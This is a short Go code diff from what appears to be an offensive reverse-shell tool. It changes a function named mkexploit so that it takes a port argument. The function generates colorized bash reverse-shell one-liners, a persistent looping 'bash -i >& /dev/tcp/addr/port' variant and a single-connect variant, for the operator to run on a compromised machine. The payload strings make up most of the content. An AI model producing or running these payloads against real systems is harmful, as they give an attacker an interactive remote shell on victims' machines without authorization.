@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"strings"
 )
 
 func contains(s string, arr []string) bool {
@@ -14,12 +13,12 @@ func contains(s string, arr []string) bool {
 	return false
 }
 
-func mkexploit(addr string) string {
+func mkexploit(addr string, port string) string {
 	return ``+Fore["GREEN"]+`Default:`+Fore["RESET"]+`
-`+Fore["MAGENTA"]+`while`+Fore["RESET"]+` `+Fore["BLUE"]+`true`+Fore["RESET"]+`; `+Fore["BLUE"]+`do`+Fore["RESET"]+` `+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+strings.Split(_server, ":")[1]+` 0>&1'`+Fore["RESET"]+`; `+Fore["BLUE"]+`sleep`+Fore["RESET"]+` `+Fore["GREEN"]+`10`+Fore["RESET"]+`; `+Fore["MAGENTA"]+`done`+Fore["RESET"]+` 
+`+Fore["MAGENTA"]+`while`+Fore["RESET"]+` `+Fore["BLUE"]+`true`+Fore["RESET"]+`; `+Fore["BLUE"]+`do`+Fore["RESET"]+` `+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+port+` 0>&1'`+Fore["RESET"]+`; `+Fore["BLUE"]+`sleep`+Fore["RESET"]+` `+Fore["GREEN"]+`10`+Fore["RESET"]+`; `+Fore["MAGENTA"]+`done`+Fore["RESET"]+` 
 
 `+Fore["GREEN"]+`Single Connect:`+Fore["RESET"]+`
-`+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+strings.Split(_server, ":")[1]+` 0>&1'`+Fore["RESET"]+``
+`+Fore["BLUE"]+`bash`+Fore["RESET"]+` `+Fore["MAGENTA"]+`-c`+Fore["RESET"]+` `+Fore["YELLOW"]+`'bash -i >& /dev/tcp/`+addr+`/`+port+` 0>&1'`+Fore["RESET"]+``
 
 }
 
